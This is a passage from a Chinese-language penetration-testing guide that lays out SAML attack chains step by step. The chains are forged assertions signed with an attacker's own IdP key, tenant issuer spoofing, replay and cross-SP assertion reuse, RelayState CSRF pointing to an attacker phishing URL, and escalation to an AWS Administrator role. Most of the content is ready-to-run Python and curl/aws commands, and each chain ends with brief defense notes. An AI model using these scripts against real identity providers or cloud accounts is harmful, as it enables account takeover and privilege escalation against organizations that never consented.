**步骤 2 - 自建 IdP 并签发伪造 Assertion**:
```bash
# 使用 SimpleSAMLphp 或 saml-tools 自建 IdP
# 配置 IdP issuer: https://idp.evil.com
# 生成自签名 X.509 证书(需被目标 SP 信任, 或利用证书混淆)

# 构造 SAML Response, issuer 设为合法 IdP 但用自建 IdP 密钥签名
python3 << 'PYEOF'
# 文件名: saml_cert_confusion.py
from signxml import XMLSigner
from lxml import etree
import base64

# 读取预构造的未签名 SAML Response(issuer 设为合法 IdP)
tree = etree.parse('/tmp/forged_response.xml')
# 伪造 issuer 为目标信任的合法 IdP
issuer = tree.xpath('//saml:Issuer', namespaces={'saml':'urn:oasis:names:tc:SAML:2.0:assertion'})[0]
issuer.text = 'https://idp.target.com'  # 合法 IdP issuer
# 但用攻击者自建的 X.509 密钥签名
signer = XMLSigner(signature_algorithm='rsa-sha256', digest_algorithm='sha256')
# key_file 为攻击者自建 IdP 的私钥(若 SP 信任该证书或证书校验缺陷)
signed = signer.sign(tree, key_file='/tmp/attacker_key.pem', cert_file='/tmp/attacker_cert.pem')
xml_bytes = etree.tostring(signed, xml_declaration=True, encoding='UTF-8')
print(base64.b64encode(xml_bytes).decode())
PYEOF
```

**步骤 3 - 多租户 tenant 切换绕过**:
```bash
# Azure AD / Okta 多租户场景: SP 接受任意 tenant 的 token
# 攻击者在自己的 tenant 中注册, 但 issuer 中 tenant 改为目标 tenant
# 若 SP 不校验 issuer 的 tenant 与签名证书来源一致 -> 证书混淆

# 构造 issuer 为目标 tenant:
# <saml:Issuer>https://sts.windows.net/{VICTIM_TENANT_ID}/</saml:Issuer>
# 但用攻击者 tenant 的密钥签名
# SP 验证签名通过(信任该 tenant 证书), 读取 issuer 为 victim tenant -> 账户混淆

# 利用 CVE-2026-42354 模式(邮箱绑定无验证):
curl -sk -X POST https://sentry.target.com/auth/saml/acs \
  -d "SAMLResponse=$(base64 -w0 /tmp/forged_email_binding.xml)" \
  -d "RelayState="
# forged_email_binding.xml 中 email 设为 victim@target.com
# Sentry 不验证邮箱归属 -> 攻击者以受害者身份登录
```

**防御要点**: SP 必须校验签名证书与 `<saml:Issuer>` 一一对应;多租户必须校验 tenant 隔离;邮箱绑定必须验证归属。

---

### 攻击链 3: SAML 重放攻击

**目标画像**: SP 未追踪 `InResponseTo`,或允许 IdP 发起的 SSO(无请求状态),且 `NotOnOrAfter` 窗口过宽。

**步骤 1 - 捕获并保存合法 SAML Response**:
```bash
# 以受害者身份(或攻击者自身账户)正常登录, 在 Burp 中保存完整 ACS POST 请求
# 提取 SAMLResponse base64 值
# 保存为文件以便后续重放
echo "PHNhbWxwOlJlc3BvbnNl..." > /tmp/captured_saml.b64
```

**步骤 2 - 测试重放防护(登出后重放)**:
```bash
# 步骤 1: 正常登录, 获取 session
curl -sk -X POST https://sp.target.com/saml/acs \
  -d "SAMLResponse=$(cat /tmp/captured_saml.b64)" \
  -c /tmp/session1.txt -o /dev/null -w "登录: HTTP %{http_code}\n"

# 步骤 2: 登出
curl -sk -b /tmp/session1.txt https://sp.target.com/logout -o /dev/null -w "登出: HTTP %{http_code}\n"

# 步骤 3: 重放同一个 SAMLResponse(关键测试)
curl -sk -X POST https://sp.target.com/saml/acs \
  -d "SAMLResponse=$(cat /tmp/captured_saml.b64)" \
  -c /tmp/session2.txt -o /dev/null -w "重放: HTTP %{http_code}\n"

# 若重放返回 302 + Set-Cookie -> 重放未防护(无 InResponseTo 追踪)
grep -i "Set-Cookie" /tmp/session2.txt
```

**步骤 3 - 跨账户/跨 SP 重放**:
```bash
# 测试 1: 跨账户重放(若 SP 接受 IdP 发起的 SSO, 无 InResponseTo 校验)
# 将捕获的 SAMLResponse 直接发给另一个 SP 的 ACS
curl -sk -X POST https://sp2.target.com/saml/acs \
  -d "SAMLResponse=$(cat /tmp/captured_saml.b64)" \
  -o /dev/null -w "跨 SP 重放: HTTP %{http_code}\n"
# 若 Audience 未校验 -> 跨 SP 重放成功

# 测试 2: 篡改 NotOnOrAfter 扩大重放窗口(若签名缺失/可绕过)
# 将 NotOnOrAfter 改为远期时间, 使捕获的 Response 长期可重放
python3 -c "
import base64
with open('/tmp/captured_saml.b64') as f:
    xml = base64.b64decode(f.read()).decode()
# 替换 NotOnOrAfter 为远期时间
xml = xml.replace('NotOnOrAfter=\"2026-07-23T12:00:00Z\"', 'NotOnOrAfter=\"2099-12-31T23:59:59Z\"')
print(base64.b64encode(xml.encode()).decode())
" > /tmp/extended_saml.b64
# 注意: 此篡改仅在签名缺失或可绕过时有效
```

**步骤 4 - 检测绕过技巧**:
```bash
# 绕过 1: 利用 SP 允许的时钟偏差(通常 ±5min~±8h)
# 若偏差为 8h, 捕获的 Response 在 8h 内均可重放

# 绕过 2: IdP 发起的 SSO 天然无 InResponseTo
# 直接 POST 自构造 Response 到 ACS(无 SAMLRequest 上下文)
curl -sk -X POST https://sp.target.com/saml/acs \
  -d "SAMLResponse=$(base64 -w0 /tmp/idp_initiated.xml)" \
  -o /dev/null -w "IdP 发起重放: HTTP %{http_code}\n"

# 绕过 3: SessionIndex 未追踪 -> 同一 SessionIndex 可跨登录复用
```

**防御要点**: SP 必须追踪 `InResponseTo`(缓存已用 assertion ID);校验 `NotBefore`/`NotOnOrAfter` 且时钟偏差最小化;IdP 发起 SSO 需额外防护;Audience/Recipient 严格校验。

---

### 攻击链 4: 2026 - 云 SSO 联邦(AWS/Azure AD)SAML 攻击

**目标画像**: 企业使用 Azure AD 作为 IdP,通过 SAML 联邦到 AWS IAM Identity Center / 第三方 SaaS。
**CVE 参考**: CVE-2026-41103(Atlassian MS SSO 插件);2026 年云 SSO 配置错误趋势(RelayState CSRF + 属性过度信任)。

**步骤 1 - 识别云 SSO 联邦配置**:
```bash
# 检查 Azure AD 企业应用的 SAML 配置
# 通过 Microsoft Graph API 获取 SAML 联邦配置(需已认证会话)
az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId eq 'APP_ID'" \
  --query "value[].{id:id, displayName:displayName, samlMetadata:samlMetadataUrl}"

# 检查 AWS IAM Identity Center 的 SAML 信任关系
aws sso-admin list-instances --query "Instances[].{StoreType:IdentityStoreType, Name:Name}"
aws sso-admin list-permission-sets --instance-arn "arn:aws:sso:::instance/INS-ID"

# 关键检查项:
# 1. ACS URL 是否可被篡改(应用端是否校验 Destination)
# 2. 属性映射中 role/groups 是否直接用于 AWS 角色假设
# 3. RelayState 是否被校验
```

**步骤 2 - IdP 发起 SSO + RelayState CSRF 攻击**:
```bash
# Azure AD 支持 IdP 发起的 SAML 流程, RelayState 可被攻击者控制
# 攻击者登录自己的 Azure AD 账户, 触发针对目标 SP 的 SSO
# 获取 SAML Response URL, 将其发给受害者

# 构造 IdP 发起的 SSO 链接(携带恶意 RelayState)
IDP_SSO_URL="https://login.microsoftonline.com/${TENANT_ID}/saml2?SAMLRequest=...&RelayState=https://attacker.com/phish"

# 受害者浏览器已有 IdP 会话 -> 自动跳转到 SP ACS
# SP 接受 SAML Response(IdP 发起, 无 InResponseTo 验证)
# 若 RelayState 未校验 -> 可用于 CSRF(引导受害者执行敏感操作)

# 利用属性映射过度信任提权:
# Azure AD SAML claim 中 role 设置为 AWS 管理员角色
# 若 AWS IAM Identity Center 直接信任 role claim -> 攻击者获取 AWS 管理权限
```

**步骤 3 - 跨 SP 断言重用(联邦链)**:
```python
#!/usr/bin/env python3
# 文件名: cloud_sso_replay.py
# 云 SSO 联邦链中断言重用攻击
import requests, base64

# 场景: Azure AD 联邦到多个 SaaS(SP-A, SP-B)
# 攻击者从 SP-A(自己有账户)捕获合法 SAML Response
# 由于 SP-B 未校验 Audience, 同一 Response 可用于 SP-B

# 从 SP-A 捕获的 SAML Response
with open('/tmp/saml_from_spA.b64') as f:
    saml_response = f.read().strip()

# 重放到 SP-B 的 ACS
r = requests.post('https://sp-b.target.com/saml/acs',
    data={'SAMLResponse': saml_response, 'RelayState': ''},
    verify=False, allow_redirects=False)
print(f'[+] SP-B 重放结果: HTTP {r.status_code}')
if 'Set-Cookie' in r.headers:
    print(f'[+] 获取 SP-B session: {r.headers["Set-Cookie"][:100]}')
# 若成功 -> 跨 SP 断言重用(Audience 未隔离)
```

**步骤 4 - 检测绕过技巧**:
```bash
# 绕过 1: 利用云厂商的元数据端点获取 SP 信任的 IdP 证书指纹
curl -s https://sp.target.com/saml/metadata | grep -i "X509Certificate\|EntityID"
# 若元数据公开 -> 攻击者可了解信任链, 针对性伪造

# 绕过 2: 利用 Azure AD 的 "group claim" 过度信任
# 若 SP 直接将 Azure AD 的 group claim 映射为本地 admin 角色
# 攻击者在自己的 tenant 中创建同名 group -> 获取 SP 管理员权限
# (需 SP 不校验 issuer tenant 来源)

# 绕过 3: AWS 联邦的 SAMLRoleAttribute 映射攻击
# 修改 SAML Response 中 Role attribute 为 arn:aws:iam::ACCOUNT:role/Administrator
# 若 AWS 信任 federation 不校验角色来源 -> 攻击者假设管理员角色
aws sts assume-role-with-saml \
  --role-arn "arn:aws:iam::123456789012:role/Administrator" \
  --principal-arn "arn:aws:iam::123456789012:saml-provider/AzureAD" \
  --saml-assertion "$(base64 -w0 /tmp/forged_aws_saml.xml)"
```

**防御要点**: 云 SSO 必须校验 Audience 隔离(每个 SP 独立 Audience);RelayState 需绑定会话且校验来源;属性映射不应直接信任 role/groups 做权限提升;多租户必须校验 issuer tenant 来源与签名证书一致。
